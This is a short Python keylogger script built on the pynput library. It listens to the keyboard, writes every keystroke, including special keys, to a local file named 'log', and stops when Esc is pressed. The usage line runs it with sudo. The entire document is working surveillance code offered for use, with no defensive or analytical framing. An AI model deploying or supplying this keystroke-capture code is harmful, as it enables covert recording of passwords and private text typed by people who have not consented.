"""
	Usage: sudo python3.7 keylogger.py
	Source: https://pypi.org/project/pynput/
"""

#!/usr/bin/env python3.7

from pynput import keyboard

log = open("log", "w")

def on_press(key):
	try:
		#alfanumerical key was pressed
		log.write("{0}\n".format(key.char))
	except AttributeError:
		#not alnum keys
		log.write("{0}\n".format(key))


def on_release(key):
	if (key == keyboard.Key.esc):
		return False #stop listener


#start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

log.close()
